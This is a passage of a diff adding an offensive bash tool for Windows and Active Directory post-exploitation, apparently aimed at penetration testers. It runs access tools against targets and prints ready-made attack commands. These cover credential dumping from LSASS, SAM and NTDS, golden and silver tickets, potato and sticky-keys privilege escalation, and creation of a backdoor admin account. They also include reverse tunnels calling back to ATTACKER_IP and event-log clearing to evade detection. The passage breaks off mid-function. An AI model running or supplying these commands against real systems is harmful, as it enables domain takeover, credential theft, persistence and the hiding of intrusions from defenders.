+            if [[ "$use_hash" == "1" ]]; then
+                print_cmd "${XFREERDP_CMD} /v:${ip} /u:'${user}' /pth:${hash_val} ${XFREERDP_CERT} /dynamic-resolution +clipboard"
+            else
+                print_cmd "${XFREERDP_CMD} /v:${ip} /u:'${user}' /p:'${cred}' ${XFREERDP_CERT} /dynamic-resolution +clipboard"
+            fi ;;
+    esac
+
+    # ── Always show RDP if port 3389 is open (and wasn't the primary tool) ─
+    if $rdp_open && [[ "$tool" != "rdp" ]]; then
+        lprint "${BOLD}  [RDP] Desktop Access ${CYAN}(port 3389 open)${NC}"
+        if [[ "$use_hash" == "1" ]]; then
+            print_cmd "${XFREERDP_CMD} /v:${ip} /u:'${user}' /pth:${hash_val} ${XFREERDP_CERT} /dynamic-resolution +clipboard"
+        else
+            print_cmd "${XFREERDP_CMD} /v:${ip} /u:'${user}' /p:'${cred}' ${XFREERDP_CERT} /dynamic-resolution +clipboard"
+        fi
+        print_cmd "${NXC_CMD} rdp ${ip} ${auth_h} --screenshot --screentime 5  ${DIM}# verify RDP without opening GUI${NC}"
+    fi
+
+    # ── Credential Dumping ────────────────────────────────────────────────
+    local step=2
+    if [[ "$is_admin" == "true" ]]; then
+        lprint "${BOLD}  [${step}] Credential Dumping ${BGRN}(Local Admin Confirmed)${NC}"; ((step++))
+        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M lsassy        ${DIM}# in-memory LSASS dump (most AV-safe)${NC}"
+        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M nanodump       ${DIM}# LSASS via MiniDump handle bypass${NC}"
+        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M handlekatz     ${DIM}# duplicate LSASS handle technique${NC}"
+        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M procdump       ${DIM}# Sysinternals procdump${NC}"
+        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --sam             ${DIM}# SAM hashes (local accounts)${NC}"
+        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --lsa             ${DIM}# LSA secrets (service/cached creds)${NC}"
+        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --dpapi           ${DIM}# DPAPI blobs: Chrome, WiFi, creds${NC}"
+        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M masky          ${DIM}# ADCS cert-based hash capture${NC}"
+        lprint "    ${DIM}# Remote all-in-one dump:${NC}"
+        print_cmd "$(impacket_cmd secretsdump) ${auth_p}            ${DIM}# dump SAM + LSA + cached + DPAPI${NC}"
+        print_cmd "$(impacket_cmd secretsdump) ${auth_p} -just-dc-ntlm  ${DIM}# DC only — NT hashes (fast)${NC}"
+
+        if [[ "$is_da" == "true" ]]; then
+            lprint "${BOLD}  [DA] DCSync — Domain Full Compromise${NC}"
+            local sd; sd=$(impacket_cmd secretsdump)
+            print_cmd "${sd} ${auth_p} -just-dc-ntlm         ${DIM}# all domain NT hashes${NC}"
+            print_cmd "${sd} ${auth_p} -just-dc              ${DIM}# all + Kerberos keys + history${NC}"
+            print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --ntds ${DIM}# NXC NTDS dump (saved to file)${NC}"
+            lprint "    ${DIM}# Golden Ticket — dump krbtgt first:${NC}"
+            print_cmd "${sd} ${auth_p} -just-dc-user krbtgt"
+            print_cmd "$(impacket_cmd ticketer) -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain ${domain:-DOMAIN} Administrator"
+            lprint "    ${DIM}# Silver Ticket — for service impersonation:${NC}"
+            print_cmd "$(impacket_cmd ticketer) -nthash SERVICE_HASH -domain-sid DOMAIN_SID -domain ${domain:-DOMAIN} -spn cifs/TARGET.${domain:-DOMAIN} Administrator"
+        fi
+    else
+        lprint "${BOLD}  [${step}] Credential Hunting ${DIM}(not local admin — enumerate first)${NC}"; ((step++))
+        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M gpp_password      ${DIM}# GPP stored plaintext passwords in SYSVOL${NC}"
+        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M gpp_autologin     ${DIM}# autologin credentials in Group Policy${NC}"
+        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M dpapi             ${DIM}# user DPAPI secrets (no admin needed)${NC}"
+        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M winscp            ${DIM}# WinSCP saved sessions & credentials${NC}"
+        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M mobaxterm          ${DIM}# MobaXterm saved credentials${NC}"
+        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M putty             ${DIM}# PuTTY saved private keys${NC}"
+        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M rdcman            ${DIM}# RDCMan saved connections + creds${NC}"
+        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M veeam             ${DIM}# Veeam backup service credentials${NC}"
+        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M keepass_discover   ${DIM}# locate KeePass .kdbx files${NC}"
+        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M keepass_trigger    ${DIM}# export KeePass db via trigger (no master pw)${NC}"
+        lprint "    ${DIM}# Spider shares for juicy files (config, creds, scripts):${NC}"
+        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M spider_plus -o READ_ONLY=true EXCLUDE_EXTS=exe,dll,msi"
+    fi
+
+    # ── Privilege Escalation ──────────────────────────────────────────────
+    if echo "$privs" | grep -qi "SeImpersonatePrivilege\|SeAssignPrimaryTokenPrivilege"; then
+        lprint "${BOLD}  [${step}] PrivEsc — SeImpersonatePrivilege ${BRED}(POTATO ATTACKS)${NC}"; ((step++))
+        if [[ "$is_admin" == "true" ]]; then
+            print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M impersonate           ${DIM}# list available tokens${NC}"
+            print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M impersonate -o TOKEN_ID=0  ${DIM}# steal SYSTEM token${NC}"
+        fi
+        lprint "    ${DIM}# Upload binary to C:\\Windows\\Temp\\ then execute:${NC}"
+        print_cmd "GodPotato-NET4.exe -cmd 'net localgroup Administrators ${user} /add'"
+        print_cmd "PrintSpoofer64.exe -i -c cmd                            ${DIM}# https://github.com/itm4n/PrintSpoofer${NC}"
+        print_cmd "SweetPotato.exe -e EfsRpc -p cmd.exe                    ${DIM}# https://github.com/CCob/SweetPotato${NC}"
+        print_cmd "JuicyPotatoNG.exe -t * -p cmd.exe -a '/c whoami > C:\\Temp\\out.txt'  ${DIM}# https://github.com/antonioCoco/JuicyPotatoNG${NC}"
+        print_tip "Download GodPotato: https://github.com/BeichenDream/GodPotato/releases"
+    fi
+
+    if echo "$privs" | grep -qi "SeBackupPrivilege"; then
+        lprint "${BOLD}  [${step}] PrivEsc — SeBackupPrivilege ${BRED}(NTDS.dit Extraction)${NC}"; ((step++))
+        lprint "    ${DIM}# In evil-winrm session:${NC}"
+        print_cmd 'reg save HKLM\SYSTEM C:\Temp\SYSTEM.bak'
+        print_cmd 'reg save HKLM\SAM C:\Temp\SAM.bak'
+        print_cmd 'robocopy /b %SYSTEMROOT%\ntds C:\Temp ntds.dit'
+        lprint "    ${DIM}# After downloading files locally:${NC}"
+        print_cmd "$(impacket_cmd secretsdump) -ntds ntds.dit -system SYSTEM.bak LOCAL"
+        print_cmd "$(impacket_cmd secretsdump) -sam SAM.bak -system SYSTEM.bak LOCAL"
+    fi
+
+    if echo "$privs" | grep -qi "SeDebugPrivilege"; then
+        lprint "${BOLD}  [${step}] PrivEsc — SeDebugPrivilege ${BRED}(Direct LSASS Access)${NC}"; ((step++))
+        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M nanodump        ${DIM}# via nxc${NC}"
+        lprint "    ${DIM}# In session (PowerShell):${NC}"
+        print_cmd "rundll32 comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\l.dmp full"
+        print_cmd "pypykatz lsa minidump l.dmp  ${DIM}# parse locally${NC}"
+    fi
+
+    if echo "$privs" | grep -qi "SeTakeOwnershipPrivilege"; then
+        lprint "${BOLD}  [${step}] PrivEsc — SeTakeOwnershipPrivilege ${BRED}(Own Any Object)${NC}"; ((step++))
+        print_cmd "takeown /f C:\\Windows\\System32\\Utilman.exe"
+        print_cmd "icacls C:\\Windows\\System32\\Utilman.exe /grant '${user}':F"
+        print_cmd "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\Utilman.exe"
+        print_tip "RDP to target, press Win+U at lock screen → SYSTEM cmd.exe"
+    fi
+
+    if echo "$privs" | grep -qi "SeLoadDriverPrivilege"; then
+        lprint "${BOLD}  [${step}] PrivEsc — SeLoadDriverPrivilege ${BRED}(Kernel Driver LPE)${NC}"; ((step++))
+        print_tip "EoPLoadDriver: https://github.com/TarlogicSecurity/EoPLoadDriver"
+        print_cmd "EoPLoadDriver.exe System\\CurrentControlSet\\MyService C:\\path\\Capcom.sys"
+    fi
+
+    if echo "$privs" | grep -qi "SeRestorePrivilege"; then
+        lprint "${BOLD}  [${step}] PrivEsc — SeRestorePrivilege ${BRED}(Write Any File)${NC}"; ((step++))
+        print_tip "Write to System32 → DLL hijack any privileged service"
+        print_tip "Overwrite SAM/SECURITY/SYSTEM registry hives"
+        print_cmd "# Copy evil DLL to C:\\Windows\\System32\\wbem\\wbemcomn.dll"
+    fi
+
+    if echo "$privs" | grep -qi "SeManageVolumePrivilege"; then
+        lprint "${BOLD}  [${step}] PrivEsc — SeManageVolumePrivilege ${BRED}(Shadow Copy NTDS)${NC}"; ((step++))
+        print_cmd "vssadmin create shadow /for=C:"
+        print_cmd "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\Windows\\NTDS\\ntds.dit C:\\Temp"
+        print_cmd "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\Windows\\System32\\config\\SYSTEM C:\\Temp"
+        print_cmd "$(impacket_cmd secretsdump) -ntds ntds.dit -system SYSTEM LOCAL"
+    fi
+
+    # ── Token Impersonation ───────────────────────────────────────────────
+    if [[ "$is_admin" == "true" ]]; then
+        lprint "${BOLD}  [${step}] Token Impersonation${NC}"; ((step++))
+        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M impersonate              ${DIM}# enumerate all available tokens${NC}"
+        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M impersonate -o TOKEN_ID=0 ${DIM}# impersonate (0 = SYSTEM usually)${NC}"
+        lprint "    ${DIM}# In evil-winrm with PowerView loaded:${NC}"
+        print_cmd "Invoke-UserImpersonation -Credential (Get-Credential)"
+        print_cmd "Invoke-RevertToSelf  ${DIM}# drop impersonation${NC}"
+    fi
+
+    # ── Host Enumeration ──────────────────────────────────────────────────
+    lprint "${BOLD}  [${step}] Host Enumeration${NC}"; ((step++))
+    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --shares                    ${DIM}# SMB shares and permissions${NC}"
+    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --users                     ${DIM}# domain/local users${NC}"
+    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --groups                    ${DIM}# domain groups${NC}"
+    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --local-groups               ${DIM}# local groups (incl. Administrators)${NC}"
+    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --sessions                  ${DIM}# active user sessions on host${NC}"
+    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --loggedon-users             ${DIM}# who is currently logged on${NC}"
+    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --pass-pol                  ${DIM}# !! check lockout threshold before spraying !!${NC}"
+    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M enum_av                  ${DIM}# detect AV/EDR product${NC}"
+    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M enum_dns                 ${DIM}# enumerate internal DNS records${NC}"
+    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M subnets                  ${DIM}# find internal subnets from routes${NC}"
+    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M security-questions       ${DIM}# check stored security Q/A${NC}"
+    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M spider_plus -o READ_ONLY=true  ${DIM}# spider all shares for sensitive files${NC}"
+    [[ "$is_admin" == "true" ]] && \
+        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M whoami               ${DIM}# verify execution context${NC}"
+
+    # ── Active Directory Attacks ──────────────────────────────────────────
+    lprint "${BOLD}  [${step}] Active Directory Attacks${NC}"; ((step++))
+    lprint "    ${DIM}# ── Kerberoasting ────────────────────────────────────────────${NC}"
+    print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} --kerberoasting kerberoast.txt    ${DIM}# request TGS for SPN accounts${NC}"
+    print_cmd "$(impacket_cmd GetUserSPNs) ${auth_p} -outputfile kerberoast.txt  ${DIM}# impacket alternative${NC}"
+    print_cmd "hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt  ${DIM}# crack RC4 TGS${NC}"
+    print_cmd "hashcat -m 19600 kerberoast.txt /usr/share/wordlists/rockyou.txt  ${DIM}# crack AES128 TGS${NC}"
+    print_cmd "hashcat -m 19700 kerberoast.txt /usr/share/wordlists/rockyou.txt  ${DIM}# crack AES256 TGS${NC}"
+    lprint "    ${DIM}# ── AS-REP Roasting ──────────────────────────────────────────${NC}"
+    print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} --asreproast asrep.txt           ${DIM}# accounts without Kerberos preauth${NC}"
+    print_cmd "$(impacket_cmd GetNPUsers) ${auth_p} -no-pass -request -outputfile asrep.txt  ${DIM}# impacket${NC}"
+    print_cmd "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt       ${DIM}# crack AS-REP${NC}"
+    lprint "    ${DIM}# ── BloodHound ────────────────────────────────────────────────${NC}"
+    print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} --bloodhound -c All              ${DIM}# full collection via nxc${NC}"
+    print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} --bloodhound -c DCOnly           ${DIM}# DC-only (faster, less noise)${NC}"
+    if [[ -n "$domain" ]]; then
+        if [[ "$use_hash" == "1" ]]; then
+            print_cmd "bloodhound-python -u '${user}' --hashes :${hash_val} -d ${domain} -ns ${ip} -c All --zip"
+        else
+            print_cmd "bloodhound-python -u '${user}' -p '${cred}' -d ${domain} -ns ${ip} -c All --zip"
+        fi
+    fi
+    lprint "    ${DIM}# ── LDAP Enumeration ──────────────────────────────────────────${NC}"
+    print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} -M get-desc-users             ${DIM}# passwords in user descriptions${NC}"
+    print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} -M MAQ                        ${DIM}# machine account quota (RBCD prereq)${NC}"
+    print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} -M ldap-checker               ${DIM}# signing / channel binding config${NC}"
+    print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} -M find-computer              ${DIM}# search computers by OS/name${NC}"
+    print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} -M groupmembership -o USER=${user}  ${DIM}# all groups this user is in${NC}"
+    print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} -M daclread -o TARGET=${user}       ${DIM}# ACL rights on this user object${NC}"
+    lprint "    ${DIM}# ── Vulnerability Checks ──────────────────────────────────────${NC}"
+    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M nopac                         ${DIM}# CVE-2021-42278/42287 (sAMAccountName spoofing)${NC}"
+    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M zerologon                     ${DIM}# CVE-2020-1472 (Netlogon)${NC}"
+    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M petitpotam                    ${DIM}# CVE-2021-36942 (NTLM coerce via EFS)${NC}"
+    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M ms17-010                      ${DIM}# CVE-2017-0144 EternalBlue${NC}"
+    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M printnightmare                ${DIM}# CVE-2021-1675/34527${NC}"
+    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M shadowrdp                     ${DIM}# enable Shadow RDP hijack${NC}"
+    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M badsuccessor                  ${DIM}# CVE-2024-26229 child/parent OU esc${NC}"
+
+    # ── Kerberos Attacks ──────────────────────────────────────────────────
+    lprint "${BOLD}  [${step}] Kerberos / Delegation Attacks${NC}"; ((step++))
+    lprint "    ${DIM}# ── Pass-the-Ticket ──${NC}"
+    if [[ "$use_hash" == "1" ]]; then
+        print_cmd "$(impacket_cmd getTGT) '${dom_prefix}${user}' -hashes :${hash_val}  ${DIM}# get TGT → .ccache${NC}"
+    else
+        print_cmd "$(impacket_cmd getTGT) '${dom_prefix}${user}':'${cred}'             ${DIM}# get TGT → .ccache${NC}"
+    fi
+    print_cmd "export KRB5CCNAME=\$(ls *.ccache | head -1)                    ${DIM}# load ticket${NC}"
+    print_cmd "$(impacket_cmd psexec) -k -no-pass '${dom_prefix:-DOMAIN\\}${user}'@${ip}  ${DIM}# PtT SYSTEM shell${NC}"
+    lprint "    ${DIM}# ── Delegation ──${NC}"
+    print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} --trusted-for-delegation        ${DIM}# find unconstrained delegation hosts${NC}"
+    print_cmd "$(impacket_cmd findDelegation) ${auth_p}                         ${DIM}# all delegation configs${NC}"
+    lprint "    ${DIM}# ── RBCD (Resource-Based Constrained Delegation) ──${NC}"
+    print_tip "Requires MAQ > 0. Add a machine account, set msDS-AllowedToActOnBehalfOfOtherIdentity"
+    print_cmd "$(impacket_cmd addcomputer) ${auth_p} -computer-name 'EVIL\$' -computer-pass 'P@ss123'"
+    print_cmd "$(impacket_cmd rbcd) ${auth_p} -action write -delegate-to TARGET\$ -delegate-from EVIL\$"
+    print_cmd "$(impacket_cmd getST) ${auth_p} -spn cifs/TARGET.${domain:-DOMAIN} -impersonate Administrator"
+
+    # ── AD CS ─────────────────────────────────────────────────────────────
+    lprint "${BOLD}  [${step}] AD Certificate Services (ADCS)${NC}"; ((step++))
+    print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} -M certipy-find                  ${DIM}# find vulnerable cert templates via nxc${NC}"
+    if tool_exists certipy-ad || tool_exists certipy; then
+        local cb="certipy-ad"; tool_exists certipy && cb="certipy"
+        local dom_part=""; [[ -n "$domain" ]] && dom_part="@${domain}"
+        if [[ "$use_hash" == "1" ]]; then
+            print_cmd "${cb} find -u '${user}${dom_part}' -hashes :${hash_val} -target ${ip} -vulnerable -stdout"
+            print_cmd "${cb} req  -u '${user}${dom_part}' -hashes :${hash_val} -target ${ip} -ca 'CA-NAME' -template 'TEMPLATE'"
+        else
+            print_cmd "${cb} find -u '${user}${dom_part}' -p '${cred}' -target ${ip} -vulnerable -stdout  ${DIM}# ESC1-ESC13${NC}"
+            print_cmd "${cb} req  -u '${user}${dom_part}' -p '${cred}' -target ${ip} -ca 'CA-NAME' -template 'TEMPLATE'"
+        fi
+        print_cmd "${cb} auth -pfx user.pfx                                    ${DIM}# cert → NT hash via PKINIT${NC}"
+        print_cmd "$(impacket_cmd gettgt) -pfx-file user.pfx '${dom_prefix}${user}'  ${DIM}# cert → TGT ccache${NC}"
+    else
+        print_tip "pip install certipy-ad  — ESC1-ESC13 exploitation framework"
+    fi
+
+    # ── MSSQL-specific ────────────────────────────────────────────────────
+    if [[ "$tool" == "mssql" ]]; then
+        lprint "${BOLD}  [${step}] MSSQL Post-Exploitation${NC}"; ((step++))
+        print_warn "xp_cmdshell NOW ENABLED — disable immediately after engagement!"
+        print_cmd "$(impacket_cmd mssqlclient) ${auth_p} -windows-auth"
+        print_cmd "${NXC_CMD} mssql ${ip} ${auth_h} -q \"SELECT name FROM master.dbo.sysdatabases\""
+        print_cmd "${NXC_CMD} mssql ${ip} ${auth_h} -q \"SELECT IS_SRVROLEMEMBER('sysadmin'), SYSTEM_USER\""
+        print_cmd "${NXC_CMD} mssql ${ip} ${auth_h} -q \"SELECT * FROM OPENROWSET(BULK N'C:\\Windows\\win.ini', SINGLE_CLOB) AS Contents\""
+        print_cmd "${NXC_CMD} mssql ${ip} ${auth_h} -M mssql_priv              ${DIM}# find impersonation / trustworthy privesc${NC}"
+        lprint "    ${DIM}# mssqlclient.py interactive commands:${NC}"
+        print_cmd "enable_xp_cmdshell"
+        print_cmd "xp_cmdshell whoami /all"
+        print_cmd "xp_cmdshell net localgroup Administrators"
+        print_cmd "# DISABLE WHEN DONE: exec sp_configure 'xp_cmdshell',0; RECONFIGURE"
+    fi
+
+    # ── Lateral Movement ──────────────────────────────────────────────────
+    if [[ "$is_admin" == "true" ]]; then
+        lprint "${BOLD}  [${step}] Lateral Movement${NC}"; ((step++))
+        print_cmd "${NXC_CMD} smb SUBNET/24 ${auth_h}                          ${DIM}# verify admin across whole subnet${NC}"
+        print_cmd "$(impacket_cmd secretsdump) ${auth_p}                        ${DIM}# dump all creds for PTH spray${NC}"
+        print_cmd "${NXC_CMD} smb SUBNET/24 -u Administrator -H HASH --local-auth  ${DIM}# spray dumped local admin hash${NC}"
+        local dex; dex=$(impacket_cmd dcomexec)
+        print_cmd "${dex} ${auth_p} 'cmd.exe'                                   ${DIM}# DCOM exec to next target${NC}"
+        print_cmd "${NXC_CMD} wmi NEXT_TARGET ${auth_h} -X 'whoami'            ${DIM}# WMI pivot${NC}"
+        local atex; atex=$(impacket_cmd atexec)
+        print_cmd "${atex} ${auth_p} 'net user backdoor P@ss123 /add && net localgroup Administrators backdoor /add'  ${DIM}# sched task backdoor${NC}"
+    fi
+
+    # ── Pivoting ──────────────────────────────────────────────────────────
+    lprint "${BOLD}  [${step}] Pivoting / Tunneling${NC}"; ((step++))
+    lprint "    ${DIM}# ── Ligolo-ng (recommended for OSCP) ─────────────────────────${NC}"
+    print_cmd "  ./ligolo-proxy -selfcert -laddr 0.0.0.0:11601               ${DIM}# attacker: start proxy${NC}"
+    print_cmd "  ./agent -connect ATTACKER_IP:11601 -ignore-cert             ${DIM}# target: connect back${NC}"
+    print_cmd "  sudo ip tuntap add user kali mode tun ligolo && sudo ip link set ligolo up"
+    print_cmd "  sudo ip route add 192.168.X.0/24 dev ligolo                 ${DIM}# route target subnet${NC}"
+    lprint "    ${DIM}# ── Chisel ────────────────────────────────────────────────────${NC}"
+    print_cmd "  ./chisel server -p 8080 --reverse                           ${DIM}# attacker${NC}"
+    print_cmd "  ./chisel client ATTACKER_IP:8080 R:socks                    ${DIM}# target → SOCKS5 on 127.0.0.1:1080${NC}"
+    print_cmd "  proxychains ${NXC_CMD} smb TARGET_SUBNET/24 ${auth_h}      ${DIM}# pivot through socks${NC}"
+    lprint "    ${DIM}# ── SSH Tunneling ─────────────────────────────────────────────${NC}"
+    print_cmd "  ssh -D 1080 -N '${user}'@${ip}                             ${DIM}# SOCKS5 dynamic proxy${NC}"
+    print_cmd "  ssh -L 445:INTERNAL_HOST:445 '${user}'@${ip}               ${DIM}# port forward (for impacket)${NC}"
+    print_cmd "  ssh -R 9001:127.0.0.1:9001 '${user}'@${ip}                 ${DIM}# expose attacker listener on target${NC}"
+
+    # ── OPSEC ─────────────────────────────────────────────────────────────
+    lprint "${BOLD}  [!] OPSEC Reminders${NC}"
+    print_tip "Check lockout FIRST: ${NXC_CMD} smb ${ip} ${auth_h} --pass-pol"
+    print_tip "Check AV before uploads: ${NXC_CMD} smb ${ip} ${auth_h} -M enum_av"
+    print_tip "Clear event logs: wevtutil cl System && wevtutil cl Security && wevtutil cl Application"
+    print_tip "Clean temp files: del /f /q C:\\Windows\\Temp\\*.exe C:\\Temp\\*.bak"
+    print_tip "Disable PowerShell logging (if you enabled it): Set-ItemProperty -Path ... -Name EnableScriptBlockLogging -Value 0"
+    [[ "$tool" == "mssql" ]] && print_tip "${BRED}CRITICAL: exec sp_configure 'xp_cmdshell',0; RECONFIGURE${NC}"
+
+    lprint "${BOLD}${CYAN}╚══════════════════════════════════════════════════════════════════╝${NC}"
+    lprint ""
+}
+# ═══════════════════════════════════════════════════════════════════════════
+# TOOL EXECUTION
+# ═══════════════════════════════════════════════════════════════════════════
+run_tool() {
+    local tool="$1" user="$2" ip="$3" cred="$4" use_hash="$5" command="$6" domain="${7:-}"
+
+    [[ "$tool" == "ssh" && "$use_hash" == "1" ]] && {
+        lprint "  ${DIM}[${tool}] Skipping — SSH does not support pass-the-hash${NC}"
+        return 3; }
+
+    local cmd
+    cmd=$(build_cmd "$tool" "$user" "$ip" "$cred" "$use_hash" "$command" "$domain") || {
+        print_fail "  Failed to build command for ${tool}"; return 1; }
+
+    local timeout_val="$EXEC_TIMEOUT"
+    [[ "$tool" =~ ^winrm ]] && timeout_val="$WINRM_TIMEOUT"
+    [[ "$tool" == "rdp" ]]   && timeout_val="$RDP_TIMEOUT"
+    [[ "$tool" == "mssql" ]] && print_info "  ${YELLOW}Enabling xp_cmdshell on ${ip}...${NC}"
+
+    lprint ""
+    lprint "${INFO} ${BOLD}[${tool}]${NC} → ${CYAN}${ip}${NC} | ${YELLOW}${user}${NC}"
+    lprint "    ${DIM}$ ${cmd}${NC}"
+
+    local out rc=0
+    out=$(timeout "$timeout_val" bash -c "$cmd" 2>&1) || rc=$?
+
+    # Stream output
+    if [[ -n "$out" ]]; then
+        lprint "${DIM}  ┌─ Output ──────────────────────────────────────────────────────${NC}"
+        while IFS= read -r line; do
+            local c="$line"
+            c="${c//\[+\]/$'\033[1;32m[+]\033[0m'}"
+            c="${c//\[-\]/$'\033[1;31m[-]\033[0m'}"
+            c="${c//Pwn3d!/$'\033[1;31mPwn3d!\033[0m'}"
+            lprint "  ${DIM}│${NC} ${c}"
+        done <<< "$out"
+        lprint "${DIM}  └───────────────────────────────────────────────────────────────${NC}"
+    fi
+
+    # Parse output for privilege context
+    analyze_output "$out" "$ip" "$user"
+
+    # Timeout
+    if [[ $rc -eq 124 ]]; then
+        print_warn "  ${tool} timed out (${timeout_val}s)"
+        [[ "$tool" =~ ^winrm ]] && print_tip "Increase timeout: --winrm-timeout 60"
+        analyze_error "$tool" "timed out Connection refused" "$ip" "$user" "$cred" "$use_hash"
+        return 2
+    fi
+
+    # ── Per-tool success detection ─────────────────────────────────────────
+    case "$tool" in
+        psexec)
+            echo "$out" | grep -q "Found writable share" || {
+                print_fail "  psexec: no writable shares or auth failed"
+                analyze_error "$tool" "$out" "$ip" "$user" "$cred" "$use_hash"
+                return 1; }
+            echo "$out" | grep -q "Stopping service" && return 0
+            print_warn "  psexec: auth OK but AV blocked binary drop"
+            print_tip "Use fileless: --tools atexec,wmi"
+            return 1 ;;
+
+        winrm|winrm-ssl)
+            echo "$out" | grep -qi "WinRMAuthorizationError\|Unauthorized\|BadStatus\|ECONNREFUSED\|refused" && {
+                print_fail "  ${tool} auth failed"
+                analyze_error "$tool" "$out" "$ip" "$user" "$cred" "$use_hash"
+                return 1; }
+            # rc=0 = success; rc=1 + NoMethodError = success (evil-winrm exit quirk)
+            if [[ $rc -eq 0 ]] || { [[ $rc -eq 1 ]] && echo "$out" | grep -q "NoMethodError"; }; then
+                return 0; fi
+            print_fail "  ${tool} failed (rc=${rc})"
+            analyze_error "$tool" "$out" "$ip" "$user" "$cred" "$use_hash"
+            return 1 ;;
+
+        rdp)
+            # "[-] Clipboard" = auth WORKS but clipboard init failed → auth-only
+            if echo "$out" | grep -qi "Clipboard\|clipboard.*failed\|screentime"; then
+                if echo "$out" | grep -qi "\[+\]"; then
+                    lprint "  ${AUTH} ${YELLOW}RDP AUTH confirmed on ${ip} as ${user}${NC}"
+                    print_warn "  Screenshot/cmd init failed (expected for many configs)"
+                    local rdp_pass_arg; [[ "$use_hash" == "1" ]] && rdp_pass_arg="/pth:${hash_val}" || rdp_pass_arg="/p:'${cred}'"
+                    print_tip "Connect with: xfreerdp /v:${ip} /u:'${user}' ${rdp_pass_arg} /cert-ignore /dynamic-resolution +clipboard"
+                    record_auth_only "$ip" "rdp" "$user" "$cred"
+                    # Mark port as open for next_steps
+                    echo "3389" >> "${TMP_DIR}/ports_${ip//./_}.txt" 2>/dev/null || true
+                else
+                    print_fail "  rdp auth failed on ${ip}"
+                    analyze_error "$tool" "$out" "$ip" "$user" "$cred" "$use_hash"
+                fi
+                return 1
+            fi
+            echo "$out" | grep -q "unrecognized arguments" && {
+                print_warn "  RDP: netexec version doesn't support screenshot. Upgrade netexec."
+                # Fallback: try plain auth check
+                local plain_cmd="${NXC_CMD} rdp ${ip} -u '${user}'"
+                [[ "$use_hash" == "1" ]] && plain_cmd+=" -H ${hash_val}" || plain_cmd+=" -p '${cred}'"
+                local plain_out; plain_out=$(timeout 20 bash -c "$plain_cmd" 2>&1)
+                echo "$plain_out" | grep -q "\[+\]" && {
+                    print_auth "  RDP AUTH confirmed (legacy nxc)"
+                    record_auth_only "$ip" "rdp" "$user" "$cred"
+                }
+                return 1; }
+            # Screenshot success: has [+] no [-]
+            if echo "$out" | grep -q "\[+\]" && ! echo "$out" | grep -q "\[-\]"; then
+                return 0; fi
+            echo "$out" | grep -q "\[-\]" && {
+                print_fail "  rdp failed"
+                analyze_error "$tool" "$out" "$ip" "$user" "$cred" "$use_hash"
+                return 1; }
+            [[ -n "$out" ]] && return 0 || return 1 ;;
+
+        smbexec|atexec)
+            if echo "$out" | grep -q "\[-\]"; then
+                if echo "$out" | grep -q "\[+\]"; then
+                    print_auth "  ${tool}: CREDS VALID as ${user} on ${ip} — not local admin (no exec)"
+                    record_auth_only "$ip" "$tool" "$user" "$cred"
+                elif echo "$out" | grep -q "Could not retrieve"; then
+                    print_warn "  ${tool}: AUTH OK, exec failed (AV/EDR likely blocking)"
+                    print_tip "Try --tools atexec,wmi for fileless execution"
+                else
